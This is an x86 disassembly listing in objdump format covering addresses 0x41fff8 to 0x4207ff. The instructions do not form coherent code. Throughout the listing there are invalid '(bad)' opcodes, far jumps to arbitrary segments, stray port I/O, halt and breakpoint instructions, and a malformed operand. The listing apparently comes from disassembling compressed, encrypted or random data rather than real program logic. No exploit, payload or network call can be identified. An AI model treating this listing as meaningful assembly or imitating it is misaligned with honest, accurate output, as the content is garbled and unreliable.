  41fff8:	cmp    al,BYTE PTR [esi-0x44]
  41fffb:	dec    ebx
  41fffc:	jmp    0xc500:0x79671cac
  420003:	nop
  420004:	jmpw   0x9189
  420008:	adc    BYTE PTR [edx-0x43],0x28
  42000c:	dec    ebp
  42000d:	or     ecx,esp
  42000f:	jne    0x41fff7
  420011:	cmp    eax,0xde6d6add
  420016:	aas    
  420017:	sub    eax,0x41a5571
  42001c:	sbb    al,0x22
  42001e:	xor    ch,BYTE PTR [edx-0x6a6a049f]
  420024:	add    al,0x90
  420026:	push   edi
  420027:	adc    bl,BYTE PTR [esp+ebp*4-0x5970f8c7]
  42002e:	rol    DWORD PTR [esi+0x565f0f5e],cl
  420034:	mov    esi,DWORD PTR [edx-0x10f53867]
  42003a:	imul   ebp,DWORD PTR [esi+ecx*4-0x6c6e3a2c],0x462ef178
  420045:	clc    
  420046:	jb     0x42008d
  420048:	xor    edx,DWORD PTR [eax+0x58]
  42004b:	mov    ebp,0xd0f2c0c9
  420050:	call   esi
  420052:	pop    ss
  420053:	cwde   
  420054:	sbb    DWORD PTR ds:0xfc2a39ce,esp
  42005a:	jb     0x41fff4
  42005c:	jmp    0xf7472e6e
  420061:	fmul   QWORD PTR [ebx+0x65c3bab5]
  420067:	xchg   ecx,eax
  420068:	hlt    
  420069:	jmp    0xc966a6a5
  42006e:	push   ebx
  42006f:	addr16 out 0xf5,eax
  420072:	xor    bh,BYTE PTR [ebx-0x11]
  420075:	ja     0x420029
  420077:	aaa    
  420078:	out    dx,eax
  420079:	retf   0xc2a3
  42007c:	push   eax
  42007d:	sub    DWORD PTR [ebp-0x7c],0xacda7d70
  420084:	test   BYTE PTR [ebp-0x2f],0x27
  420088:	cmp    dl,ah
  42008a:	inc    ecx
  42008b:	aam    0x1c
  42008d:	stos   BYTE PTR es:[edi],al
  42008e:	ins    BYTE PTR es:[edi],dx
  42008f:	in     eax,dx
  420090:	sahf   
  420091:	push   edi
  420092:	cs inc eax
  420094:	push   es
  420095:	cld    
  420096:	mov    dl,0x4
  420098:	daa    
  420099:	sbb    cl,cl
  42009b:	fxch   st(4)
  42009d:	sub    eax,0x5cc17364
  4200a2:	outs   dx,DWORD PTR ds:[esi]
  4200a3:	push   eax
  4200a4:	push   ebp
  4200a5:	jl     0x420028
  4200a7:	fcmovu st,st(4)
  4200a9:	push   edi
  4200aa:	arpl   WORD PTR [ebx],si
  4200ac:	out    0x46,al
  4200ae:	das    
  4200af:	xlat   BYTE PTR ds:[ebx]
  4200b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200b1:	ror    dh,cl
  4200b3:	mov    ds:0x61fa87dd,al
  4200b8:	sub    ebx,0x9715d87
  4200be:	stos   DWORD PTR es:[edi],eax
  4200bf:	add    cl,dh
  4200c1:	xchg   edx,eax
  4200c2:	int3   
  4200c3:	sub    dl,al
  4200c5:	daa    
  4200c6:	dec    ecx
  4200c7:	mov    ecx,0x9dd367c9
  4200cc:	sbb    eax,0x36bf80a6
  4200d1:	cmp    eax,0x6fee3ef9
  4200d6:	lods   al,BYTE PTR ds:[esi]
  4200d7:	in     eax,0x3a
  4200d9:	(bad)  
  4200da:	dec    esi
  4200dc:	jb     0x420114
  4200de:	xor    BYTE PTR [eax-0x75],0x7b
  4200e2:	popa   
  4200e3:	push   edx
  4200e4:	or     al,0xee
  4200e6:	mov    ebx,0x8b12ab5e
  4200eb:	shl    DWORD PTR [edi-0x33fc3132],1
  4200f1:	xchg   ebp,eax
  4200f2:	add    dl,BYTE PTR [esi]
  4200f4:	cld    
  4200f5:	ins    DWORD PTR es:[edi],dx
  4200f6:	and    ecx,DWORD PTR ds:0xbd839931
  4200fc:	mov    ebp,0xf90880e9
  420101:	push   ss
  420102:	push   edi
  420103:	sar    BYTE PTR [ecx+edx*4],0xe3
  420107:	jnp    0x420103
  420109:	and    ecx,eax
  42010b:	lea    ebp,[edx]
  42010d:	mov    BYTE PTR [ebx+0x12d829a8],dl
  420113:	rcr    BYTE PTR [eax+0x26dee3f8],1
  420119:	mul    BYTE PTR [edx-0x20]
  42011c:	dec    edi
  42011d:	sub    al,BYTE PTR [edx]
  42011f:	adc    eax,0xd47c8224
  420124:	xchg   DWORD PTR [edx],ebx
  420126:	inc    ebp
  420127:	jno    0x42019f
  420129:	rol    BYTE PTR [eax+0x79137a1e],cl
  42012f:	hlt    
  420130:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420131:	mov    dl,ah
  420133:	push   ecx
  420134:	mov    ch,0x7
  420136:	enter  0x6ba8,0x27
  42013a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42013b:	inc    ecx
  42013c:	ins    BYTE PTR es:[edi],dx
  42013d:	(bad)  
  42013e:	hlt    
  42013f:	rcr    DWORD PTR [edx],0x71
  420142:	test   al,0x6e
  420144:	jmp    0x420171
  420146:	mov    cl,0xf0
  420148:	imul   ebp,edx,0x14
  42014b:	ror    DWORD PTR [edx+0x363d11d3],0xc
  420152:	fld    TBYTE PTR [esi]
  420154:	xor    DWORD PTR [edi+0x1a8b88a6],edi
  42015a:	or     bl,BYTE PTR [edi]
  42015c:	mov    DWORD PTR [eiz*4-0x92cea83],ebp
  420163:	nop
  420164:	dec    ecx
  420165:	xor    DWORD PTR [ecx-0x5c73cdcd],0x31506d2
  42016f:	inc    ecx
  420170:	shl    BYTE PTR [ebx],1
  420172:	jg     0x4201c2
  420174:	or     ecx,DWORD PTR [ebx+0x60ff6fcb]
  42017a:	and    al,0x2b
  42017c:	pop    es
  42017d:	and    al,0x7b
  42017f:	mov    ch,0x9
  420181:	adc    al,0x11
  420183:	mov    bh,bl
  420185:	mov    ebx,0xf5d577b6
  42018a:	or     al,BYTE PTR [eax+ecx*4-0x7f]
  42018e:	adc    DWORD PTR [ecx+0x3e021f2a],esi
  420194:	push   esp
  420195:	jle    0x42014e
  420197:	pop    edi
  420198:	mov    BYTE PTR [ebx+0x568cb350],al
  42019e:	scas   al,BYTE PTR es:[edi]
  42019f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201a0:	dec    di
  4201a2:	std    
  4201a3:	pop    esi
  4201a4:	sub    dl,dh
  4201a6:	sub    DWORD PTR [edi+0x32],esi
  4201a9:	retf   0xf22e
  4201ac:	in     eax,0xff
  4201ae:	clc    
  4201af:	cld    
  4201b0:	nop
  4201b1:	or     DWORD PTR [ebx-0x43],esp
  4201b4:	inc    esi
  4201b5:	enter  0xedf2,0x34
  4201b9:	ins    BYTE PTR es:[edi],dx
  4201ba:	push   ebx
  4201bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201bc:	or     BYTE PTR [esi-0xb],0x63
  4201c0:	mov    dh,0xd
  4201c2:	xchg   ebp,eax
  4201c3:	lods   eax,DWORD PTR ds:[esi]
  4201c4:	pop    esp
  4201c5:	inc    esi
  4201c6:	dec    edi
  4201c7:	jmp    0x40128f32
  4201cc:	imul   ebx,edx,0xb9df20ff
  4201d2:	clc    
  4201d3:	in     al,dx
  4201d4:	xor    al,0x1
  4201d6:	dec    ecx
  4201d7:	dec    esi
  4201d8:	dec    eax
  4201d9:	mov    gs,WORD PTR [edi]
  4201db:	int    0x58
  4201dd:	adc    BYTE PTR [ebx],dl
  4201df:	shl    BYTE PTR [edi+0x6b9276c1],0x94
  4201e6:	jmp    0xaf1b:0xc26f7de7
  4201ed:	scas   al,BYTE PTR es:[edi]
  4201ee:	cmp    al,0x4e
  4201f0:	mov    dl,0x1d
  4201f2:	push   edi
  4201f3:	jb     0x420192
  4201f5:	gs jae 0x420209
  4201f8:	jb     0x420253
  4201fa:	int3   
  4201fb:	adc    al,0xe2
  4201fd:	pop    edx
  4201fe:	sbb    esp,edx
  420200:	cdq    
  420201:	test   eax,0xe2ee33be
  420206:	or     eax,0x5bc74f7a
  42020b:	sbb    ecx,DWORD PTR [ebp+0x71]
  42020e:	sub    ch,cl
  420210:	xchg   edx,eax
  420211:	loope  0x4201df
  420213:	in     eax,0x89
  420215:	sbb    edx,DWORD PTR [esi+ebp*2-0x7e]
  420219:	sub    eax,0x60bdfe2e
  42021e:	xor    esi,0x570bada7
  420224:	arpl   WORD PTR [edx-0x5329c038],di
  42022a:	mov    BYTE PTR [ebx-0x6a2e90ed],dl
  420230:	mov    bh,0x3e
  420232:	and    edi,DWORD PTR [esp+ebp*4+0xe]
  420236:	std    
  420237:	mov    edx,0x1b259720
  42023c:	xor    edx,DWORD PTR [esi-0x4fd8fa15]
  420242:	aaa    
  420243:	rcr    DWORD PTR [edi+edx*4],1
  420246:	jbe    0x420252
  420248:	xor    ebp,ebp
  42024a:	add    ebx,DWORD PTR [edx-0xc]
  42024d:	(bad)
  420251:	mov    dl,0x2b
  420253:	cmc    
  420254:	into   
  420255:	dec    esi
  420256:	inc    edx
  420257:	sbb    ah,cl
  420259:	adc    edx,DWORD PTR [ebx+eiz*4+0x3f3722c2]
  420260:	cmp    ah,BYTE PTR [ebp+0x7]
  420263:	aas    
  420264:	or     esp,DWORD PTR [edi+0x4caa2415]
  42026a:	aad    0xc4
  42026c:	xor    eax,0xa8140d8d
  420271:	out    0x29,al
  420273:	mov    ebp,0x6069cca6
  420278:	mov    fs,ebp
  42027a:	xchg   esp,eax
  42027b:	popf   
  42027c:	jnp    0x4202b4
  42027e:	pop    ebx
  42027f:	aas    
  420280:	aam    0xb
  420282:	(bad)  
  420283:	shl    ebx,1
  420285:	inc    edx
  420286:	sub    al,0xc4
  420288:	aad    0xf2
  42028a:	jmp    0x4202f6
  42028c:	and    BYTE PTR [ecx+0x660e5d5],ah
  420292:	push   ss
  420293:	cmp    BYTE PTR gs:0xdf868042,ah
  42029a:	push   ecx
  42029b:	dec    ecx
  42029c:	mov    ecx,0xb6f2d9d
  4202a1:	inc    BYTE PTR [ebp-0x78]
  4202a4:	stos   BYTE PTR es:[edi],al
  4202a5:	lock cmc 
  4202a7:	stc    
  4202a8:	mov    bh,0xb3
  4202aa:	push   0x2239cd1a
  4202af:	inc    edi
  4202b0:	xchg   edi,eax
  4202b1:	fistp  QWORD PTR [ebp+0x4d]
  4202b4:	jmp    0x88e85a5f
  4202b9:	push   eax
  4202ba:	sub    eax,0x48493ac5
  4202bf:	fisttp DWORD PTR [eax-0x1a]
  4202c2:	rcl    BYTE PTR ds:0xe4a56682,cl
  4202c8:	jge    0x4202ed
  4202ca:	xchg   esi,eax
  4202cb:	repz xchg ebp,eax
  4202cd:	xor    DWORD PTR [eax-0x47],edx
  4202d0:	hlt    
  4202d1:	pop    edx
  4202d2:	sbb    eax,0x2e40d57b
  4202d7:	outs   dx,BYTE PTR ds:[esi]
  4202d8:	push   es
  4202d9:	cmc    
  4202da:	xchg   esp,eax
  4202db:	mov    ebx,0xd80a450d
  4202e0:	inc    eax
  4202e1:	out    0x52,al
  4202e3:	in     al,dx
  4202e4:	cmp    al,BYTE PTR [ebp+0x1970b72c]
  4202ea:	cmp    dh,ch
  4202ec:	ret    0x6c5d
  4202ef:	mov    ds:0x4f1464f7,eax
  4202f4:	bound  ebp,QWORD PTR [edi+0x27d56572]
  4202fa:	push   ebp
  4202fb:	imul   ebx,DWORD PTR [esi+0x75],0x2e
  4202ff:	in     eax,0xf8
  420301:	xchg   esp,eax
  420302:	or     ebx,0x34
  420305:	fisub  DWORD PTR [ecx-0x36011807]
  42030b:	fcomp  DWORD PTR [ecx-0x42cea223]
  420311:	mov    al,ds:0xcbbd6178
  420316:	push   cs
  420317:	into   
  420318:	cmp    dh,BYTE PTR [esi]
  42031a:	push   ss
  42031b:	dec    edi
  42031c:	sub    eax,esi
  42031e:	push   eax
  42031f:	jbe    0x4202b9
  420321:	xchg   esp,eax
  420322:	cwde   
  420323:	and    BYTE PTR [edi*8+0x4187c3fc],dh
  42032a:	cmp    BYTE PTR [eax+0x24],cl
  42032d:	push   0xffffffab
  42032f:	std    
  420330:	les    esi,FWORD PTR [esi+0x39a884b3]
  420336:	jmp    0xe9e5:0x375244c6
  42033d:	fidiv  DWORD PTR ds:0x5d2e31d6
  420343:	xor    dl,dl
  420345:	mov    edi,0x36923f86
  42034a:	ror    dh,0x21
  42034d:	shl    DWORD PTR [eax-0x6f1d5974],0x5a
  420354:	int3   
  420355:	fistp  WORD PTR [edi-0x78]
  420358:	and    ch,BYTE PTR [ebx]
  42035a:	adc    BYTE PTR [ebx+edi*2],ch
  42035d:	iret   
  42035e:	sbb    BYTE PTR [edi+0x46],0x60
  420362:	out    0x5,eax
  420364:	(bad)  [esi-0x37b37797]
  42036a:	or     eax,0x2657a9b2
  42036f:	xor    DWORD PTR [ecx-0xb],0xffffffd7
  420373:	cs and al,0xee
  420376:	scas   eax,DWORD PTR es:[edi]
  420377:	icebp  
  420378:	aad    0xda
  42037a:	(bad)  
  42037b:	aad    0xd9
  42037d:	(bad)  
  42037e:	cdq    
  42037f:	mov    dl,0xef
  420381:	dec    ebp
  420382:	imul   edi,esp,0xffffff9f
  420385:	cvtpi2ps xmm4,QWORD PTR [ebp+0x507547a0]
  42038c:	aaa    
  42038d:	imul   ecx,ebx,0x323ee537
  420393:	jnp    0x420354
  420395:	jp     0x4203a0
  420397:	add    eax,ebx
  420399:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42039a:	xlat   BYTE PTR ds:[ebx]
  42039b:	enter  0x2d95,0x5f
  42039f:	cmp    BYTE PTR [ebp+0x46624200],0xad
  4203a6:	cld    
  4203a7:	lds    edx,FWORD PTR [edx+0x559d3df0]
  4203ad:	and    edi,DWORD PTR [esi+0x72]
  4203b0:	and    BYTE PTR [edi],cl
  4203b2:	fwait
  4203b3:	sbb    ecx,eax
  4203b5:	shl    BYTE PTR [edx+0x434d9673],1
  4203bb:	repz jl 0x42038c
  4203be:	popa   
  4203bf:	out    dx,al
  4203c0:	aaa    
  4203c1:	leave  
  4203c2:	ins    DWORD PTR es:[edi],dx
  4203c3:	in     eax,dx
  4203c4:	js     0x42039d
  4203c6:	or     bh,ah
  4203c8:	xor    dl,dl
  4203ca:	fldcw  WORD PTR [eax+0x3f]
  4203cd:	aam    0xef
  4203cf:	pushf  
  4203d0:	mov    dl,0x2
  4203d2:	lea    ecx,[edi+0x6b]
  4203d5:	sbb    esp,ecx
  4203d7:	add    esi,DWORD PTR [esi-0x50]
  4203da:	jmp    0x420371
  4203dc:	cmc    
  4203dd:	shr    DWORD PTR [eax],0x97
  4203e0:	test   BYTE PTR [ebp+0x6c],dh
  4203e3:	cmc    
  4203e4:	call   0x135e:0xc8703046
  4203eb:	repz mov ch,0xe2
  4203ee:	adc    BYTE PTR [edi],bl
  4203f0:	jae    0x420398
  4203f2:	xor    al,BYTE PTR [eax+esi*8]
  4203f5:	enter  0x3ca0,0xf3
  4203f9:	retf   
  4203fa:	or     dh,dl
  4203fc:	cmp    eax,0x49a24495
  420401:	sbb    al,al
  420403:	in     al,0xd
  420405:	lods   al,BYTE PTR ds:[esi]
  420406:	fucomip st,st(2)
  420408:	aam    0x91
  42040a:	mov    dl,0x31
  42040c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42040d:	in     eax,0x89
  42040f:	ret    
  420410:	pop    edi
  420411:	into   
  420412:	test   BYTE PTR [edx-0x6e],bl
  420415:	xor    bl,BYTE PTR fs:[edx]
  420418:	(bad)  
  42041a:	neg    DWORD PTR [esi+ebp*2-0x2a]
  42041e:	push   ebp
  42041f:	jnp    0x42048a
  420421:	sub    eax,0xd3cd60a2
  420426:	pop    esi
  420427:	les    ecx,FWORD PTR [esi-0x57]
  42042a:	inc    esp
  42042c:	xor    ebx,DWORD PTR ds:0x54679525
  420432:	mov    ah,0x77
  420434:	push   0xffffffc2
  420436:	mov    ecx,0xe65e4f3d
  42043b:	mov    dl,0x5
  42043d:	fisttp QWORD PTR [eax+0x67839bc2]
  420443:	jp     0x420406
  420445:	inc    eax
  420446:	pop    es
  420447:	xchg   esi,eax
  420448:	jo     0x42045a
  42044a:	out    0x4b,al
  42044c:	jp     0x420450
  42044e:	mov    edi,0xe3df92ae
  420453:	fstp   DWORD PTR ds:0x6fd72a21
  420459:	stos   DWORD PTR es:[edi],eax
  42045a:	call   0x19d4bdef
  42045f:	fist   WORD PTR [ebx+0xbb859cf]
  420465:	mov    ebp,0x733ac1ce
  42046a:	jno    0x420455
  42046c:	sar    ecx,0x25
  42046f:	popa   
  420470:	inc    edx
  420471:	or     dh,dh
  420473:	hlt    
  420474:	xlat   BYTE PTR ds:[ebx]
  420475:	inc    edx
  420476:	push   esp
  420477:	xchg   DWORD PTR [edx-0x5],ebp
  42047a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42047b:	(bad)  
  42047c:	and    eax,0x626a6d3e
  420481:	(bad)  
  420482:	fld    TBYTE PTR [ebx+0x6e0f0715]
  420488:	sbb    al,0x99
  42048a:	or     esi,DWORD PTR [edx+0x40b1ad88]
  420490:	push   0x21cd50f6
  420495:	arpl   WORD PTR [edx+edx*8],si
  420498:	sub    BYTE PTR [eax+0x4c],bl
  42049b:	fisttp QWORD PTR [edi+0x692fe271]
  4204a1:	(bad)  
  4204a2:	sub    eax,0x17ccf87c
  4204a7:	mov    ebx,0x2ab6240c
  4204ac:	pop    ebx
  4204ad:	pop    edi
  4204ae:	js     0x420468
  4204b0:	mov    esi,0xabc497d5
  4204b5:	dec    esp
  4204b6:	sub    bl,BYTE PTR [ecx]
  4204b8:	push   edi
  4204b9:	test   al,0x20
  4204bb:	pop    esi
  4204bc:	hlt    
  4204bd:	push   edi
  4204be:	(bad)  
  4204bf:	dec    edi
  4204c0:	inc    eax
  4204c1:	fs pop ds
  4204c3:	jbe    0x4204c0
  4204c5:	sub    al,0x7b
  4204c7:	test   ebp,0xeba5a62c
  4204cd:	pop    ebp
  4204ce:	ins    BYTE PTR es:[edi],dx
  4204cf:	cmp    dl,BYTE PTR [edx+0x7e]
  4204d2:	popf   
  4204d3:	jne    0x420546
  4204d5:	(bad)  
  4204d6:	mov    ecx,0xa6799139
  4204db:	jne    0x420529
  4204dd:	fcomp  QWORD PTR [eax+0x6d1465d]
  4204e3:	push   cs
  4204e4:	ret    0xb2d4
  4204e7:	pop    ds
  4204e8:	push   cs
  4204e9:	jl     0x420516
  4204eb:	je     0x42047b
  4204ed:	xor    DWORD PTR [eax+0x2b],ebp
  4204f0:	(bad)  
  4204f1:	dec    esp
  4204f2:	add    al,0x1b
  4204f4:	or     DWORD PTR [ecx],0x7fa73284
  4204fa:	sub    edx,esp
  4204fc:	pusha  
  4204fd:	loopne 0x4204ce
  4204ff:	inc    ecx
  420500:	(bad)  
  420501:	xor    edi,ebp
  420503:	fimul  DWORD PTR [ebp-0x43]
  420506:	mov    dl,0x56
  420508:	std    
  420509:	pop    ss
  42050a:	xchg   esi,eax
  42050b:	fsub   st,st(2)
  42050d:	sub    al,0x8a
  42050f:	enter  0x1657,0x33
  420513:	cmp    DWORD PTR [edi+0x39],0x82d8c593
  42051a:	lea    edx,[ebx-0x32]
  42051d:	and    DWORD PTR [ebx+edi*4],ecx
  420520:	push   ss
  420521:	inc    esi
  420522:	lahf   
  420523:	cmpps  xmm0,XMMWORD PTR [edi-0x7f],0x3a
  420528:	repnz es mov ecx,0x29ec49eb
  42052f:	sar    DWORD PTR [edi-0x46],cl
  420532:	push   esp
  420533:	pop    edi
  420534:	or     BYTE PTR [edx],cl
  420536:	xor    esi,DWORD PTR ds:0xa99843ab
  42053c:	sbb    esi,DWORD PTR [edx-0x6715758]
  420542:	push   esi
  420543:	mov    ch,0x5d
  420545:	je     0x420552
  420547:	jns    0x420556
  420549:	jmp    0x24b4:0xbe9e148c
  420550:	adc    al,0x56
  420552:	mov    eax,ds:0x9b42515d
  420557:	and    eax,0x6d8af0fa
  42055c:	dec    eax
  42055d:	xor    al,0xfd
  42055f:	imul   bh
  420561:	(bad)  
  420562:	mov    edx,DWORD PTR [ecx*4+0x645adf96]
  420569:	jp     0x420595
  42056b:	dec    edx
  42056c:	sbb    eax,DWORD PTR [edi-0x4b]
  42056f:	pop    ss
  420570:	mov    bh,0xa5
  420572:	mov    ah,0x44
  420574:	fistp  WORD PTR [esi]
  420576:	les    edi,FWORD PTR [ecx-0x48a3419a]
  42057c:	jmp    0x420549
  42057e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42057f:	arpl   sp,ax
  420581:	mov    ds:0x902ab08c,eax
  420586:	adc    edi,DWORD PTR [esi]
  420588:	daa    
  420589:	dec    esi
  42058a:	pop    esp
  42058b:	jo     0x4205d4
  42058d:	das    
  42058e:	int3   
  42058f:	jb     0x42053f
  420591:	or     dh,BYTE PTR [ebx+0x34]
  420594:	cwde   
  420595:	pop    eax
  420596:	dec    eax
  420597:	add    eax,0x1ced3848
  42059c:	or     DWORD PTR [esp+ebx*4],ecx
  42059f:	mov    ebx,0x1a09fcff
  4205a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205a5:	jle    0x420537
  4205a7:	stos   DWORD PTR es:[edi],eax
  4205a8:	inc    DWORD PTR [eax-0x2e]
  4205ab:	and    DWORD PTR [ebx],esp
  4205ad:	test   eax,0xfb364e44
  4205b2:	ret    0xe388
  4205b5:	mov    ah,0xe4
  4205b7:	mov    WORD PTR [esi],cs
  4205b9:	sar    dl,0xc1
  4205bc:	lods   eax,DWORD PTR ds:[esi]
  4205bd:	enter  0xb302,0xdc
  4205c1:	popf   
  4205c2:	xchg   esp,eax
  4205c3:	lea    edi,[eax+0x6f]
  4205c6:	(bad)  
  4205c7:	std    
  4205c8:	push   esp
  4205c9:	test   edx,edi
  4205cb:	xor    BYTE PTR [ecx-0x66ad04c0],bl
  4205d1:	mov    ah,0xa1
  4205d3:	imul   ecx,DWORD PTR [esi-0x4],0x39
  4205d7:	adc    al,0x89
  4205d9:	push   ebp
  4205da:	xchg   edi,eax
  4205db:	mov    esi,0xc68d0705
  4205e0:	cwde   
  4205e1:	inc    DWORD PTR [eax-0x21305bba]
  4205e7:	out    0x9e,al
  4205e9:	sbb    BYTE PTR [edx],dh
  4205eb:	xchg   ebx,eax
  4205ec:	(bad)  
  4205ee:	out    dx,al
  4205ef:	xor    bl,BYTE PTR [ebp-0x8]
  4205f2:	loopne 0x42060f
  4205f4:	or     al,0x87
  4205f6:	cdq    
  4205f7:	xchg   edi,eax
  4205f8:	sub    ecx,DWORD PTR [esi+0xa]
  4205fb:	push   0xd48ceb48
  420600:	mov    ch,BYTE PTR [ebp-0x43]
  420603:	pop    ebx
  420604:	jnp    0x4205a1
  420606:	sbb    eax,0xb2c0a212
  42060b:	clc    
  42060c:	add    BYTE PTR [ebx],0xa
  42060f:	mov    fs,WORD PTR [ebx]
  420611:	in     eax,dx
  420612:	bound  eax,QWORD PTR [edi+0xf4cbf58]
  420618:	jge    0x420601
  42061a:	jecxz  0x420662
  42061c:	xor    BYTE PTR [esi],bh
  42061e:	dec    eax
  42061f:	jmp    0x79a1b116
  420624:	cmp    DWORD PTR [ecx],eax
  420626:	pop    esi
  420627:	fwait
  420628:	mov    edi,edx
  42062a:	sahf   
  42062b:	mov    ds:0xe5cc073f,eax
  420630:	push   edx
  420631:	outs   dx,BYTE PTR ds:[esi]
  420632:	dec    ebp
  420633:	addr16 mov ah,0x18
  420636:	and    edi,DWORD PTR [esi-0x4830421]
  42063c:	sti    
  42063d:	sbb    ah,al
  42063f:	inc    esp
  420640:	fisttp DWORD PTR [ebp+0x1a]
  420643:	mov    ah,0x8b
  420645:	ins    BYTE PTR es:[edi],dx
  420646:	cmp    BYTE PTR [edx-0x3d],dl
  420649:	xor    ecx,eax
  42064b:	push   esp
  42064c:	out    0x76,al
  42064e:	ret    
  42064f:	ror    DWORD PTR ds:0xd81491e3,1
  420655:	loope  0x420678
  420657:	scas   eax,DWORD PTR es:[edi]
  420658:	(bad)  
  420659:	stos   DWORD PTR es:[edi],eax
  42065a:	mov    ebx,0xd55141a4
  42065f:	adc    DWORD PTR [eax],edi
  420661:	add    dl,BYTE PTR [ebx-0x3d698958]
  420667:	jns    0x420680
  420669:	(bad)  
  42066a:	ins    BYTE PTR es:[edi],dx
  42066b:	push   ss
  42066c:	cmp    ebx,0xb283b41
  420672:	mov    al,ds:0x7d0c0678
  420677:	test   ch,ah
  420679:	jnp    0x420640
  42067b:	push   ebp
  42067c:	xchg   ebp,eax
  42067d:	jnp    0x4206e0
  42067f:	fwait
  420680:	aas    
  420681:	sub    DWORD PTR [ecx+edi*2-0x700e8ae8],0xffffff8d
  420689:	xchg   esp,eax
  42068a:	or     ch,BYTE PTR [edi-0x23]
  42068d:	jl     0x420627
  42068f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420690:	push   eax
  420691:	xor    ch,dh
  420693:	enter  0x15f5,0x8b
  420697:	ins    DWORD PTR es:[edi],dx
  420698:	mov    edi,0x7f5fa39a
  42069d:	pop    edi
  42069e:	inc    ecx
  42069f:	mov    bh,0xee
  4206a1:	sub    ebx,0xffffff87
  4206a4:	test   eax,0xc276279e
  4206a9:	add    BYTE PTR [edx],0xdd
  4206ac:	test   BYTE PTR [edx-0xd],ah
  4206af:	shl    bh,1
  4206b1:	inc    eax
  4206b2:	(bad)  
  4206b3:	jmp    0x4206b7
  4206b5:	pop    es
  4206b6:	or     ebx,DWORD PTR [esi]
  4206b8:	push   0xb5b3d8be
  4206bd:	scas   al,BYTE PTR es:[edi]
  4206be:	add    edi,DWORD PTR ss:[esi]
  4206c1:	or     BYTE PTR [eax+eax*4+0x33],0xb5
  4206c6:	xchg   edx,eax
  4206c7:	pop    eax
  4206c8:	imul   edx,DWORD PTR ds:[edi+0x1311933f],0xbf4fb4c
  4206d3:	not    DWORD PTR [edi-0x4e]
  4206d6:	mov    bh,0x34
  4206d8:	sbb    BYTE PTR [esi+0x60a97dee],bh
  4206de:	(bad)  
  4206df:	mov    ds:0xb4e1c48e,al
  4206e4:	ins    BYTE PTR es:[edi],dx
  4206e5:	and    al,0x93
  4206e7:	test   eax,0x9e5605d9
  4206ec:	mov    ebp,0x8a07a0ae
  4206f1:	push   esp
  4206f2:	mov    dh,0x16
  4206f5:	leave  
  4206f6:	gs shl eax,1
  4206f9:	mov    ch,0x26
  4206fb:	sbb    al,0x2
  4206fd:	scas   eax,DWORD PTR es:[edi]
  4206fe:	add    ebx,0x80ccc55a
  420704:	mov    WORD PTR [ebp+0x28e3eb1],ss
  42070a:	pop    ds
  42070b:	xor    eax,0xfd2992c4
  420710:	mov    esp,0x81f54508
  420715:	adc    dl,BYTE PTR [eax+0x1e]
  420718:	lock or al,0x7f
  42071b:	mov    bl,0x25
  42071d:	es mov eax,0x6fd92eec
  420723:	xchg   dh,bh
  420725:	mov    BYTE PTR [ecx],0xef
  420728:	(bad)  
  420729:	in     al,0xf1
  42072b:	pop    ss
  42072c:	mov    ds:0x6618eb81,al
  420731:	ss add eax,0xa6c3eef3
  420737:	ror    BYTE PTR [edi-0x48],cl
  42073a:	test   al,0x4d
  42073c:	pop    edx
  42073d:	leave  
  42073e:	jb     0x420768
  420740:	fcmovnb st,st(1)
  420742:	mov    dl,0xfa
  420744:	jmp    0xde86:0x5f82203c
  42074b:	mov    bh,0x55
  42074d:	sbb    al,0x5e
  42074f:	jbe    0x4207b8
  420751:	jmp    0x1ec1:0x31171874
  420758:	cmc    
  420759:	lods   eax,DWORD PTR ds:[esi]
  42075a:	stc    
  42075b:	imul   ebp,DWORD PTR [esi-0x50e447a9],0x9da1ff73
  420765:	xor    al,0xf2
  420767:	loopne 0x420724
  420769:	lock fs push eax
  42076c:	push   ss
  42076d:	in     al,dx
  42076e:	pop    ecx
  42076f:	fdiv   QWORD PTR [ecx+0x6e0a7b75]
  420775:	(bad)  
  420776:	inc    ecx
  420777:	and    al,0x30
  420779:	mov    ebx,0xd83954e7
  42077e:	bound  esp,QWORD PTR [ecx+eax*1-0x76]
  420782:	cmp    eax,0xc65398f9
  420787:	and    eax,0xc944cce1
  42078c:	cmp    eax,0xe127eb30
  420791:	iret   
  420792:	pop    edx
  420793:	adc    cl,BYTE PTR [eax+edi*4]
  420796:	xchg   edi,eax
  420797:	in     eax,dx
  420798:	pop    edi
  420799:	ss push ebx
  42079b:	push   ebp
  42079c:	popa   
  42079d:	cmp    bl,BYTE PTR [esi-0x21dd41f7]
  4207a3:	fisttp DWORD PTR [ecx*8+0x5c295539]
  4207aa:	inc    eax
  4207ab:	jns    0x420744
  4207ad:	mov    ecx,0x8aaa91f0
  4207b2:	ss mov bh,0xc1
  4207b5:	fisttp QWORD PTR [edx]
  4207b7:	shld   esi,ebx,cl
  4207ba:	aas    
  4207bb:	push   edx
  4207bc:	mov    WORD PTR [ebx],?
  4207be:	popf   
  4207bf:	cs mov edi,0xe6ed35f5
  4207c5:	mov    DWORD PTR [esi+0x7c698492],0x4c65085d
  4207cf:	(bad)  
  4207d0:	jnp    0x420813
  4207d2:	ret    
  4207d3:	cwde   
  4207d4:	jmp    0x6506b1e9
  4207d9:	adc    BYTE PTR [edi],al
  4207db:	jno    0x4207bc
  4207dd:	pop    ecx
  4207de:	ret    0x21ca
  4207e1:	scas   al,BYTE PTR es:[edi]
  4207e2:	mov    ebx,0xd1bbea65
  4207e7:	adc    edx,ebp
  4207e9:	dec    esi
  4207ea:	pop    ebp
  4207eb:	leave  
  4207ec:	sbb    DWORD PTR [edi],ebp
  4207ee:	test   al,0x43
  4207f0:	add    al,0xee
  4207f2:	xchg   DWORD PTR [ebx+0x26],ecx
  4207f5:	inc    eax
  4207f6:	sbb    al,BYTE PTR [eax+ebp*2]
  4207f9:	adc    DWORD PTR [esp+ebx*8],esi
  4207fc:	cli    
  4207fd:	jg     0x420782
  4207ff:	cmp    sp,WORD PTR [edx+0x2e96144d]
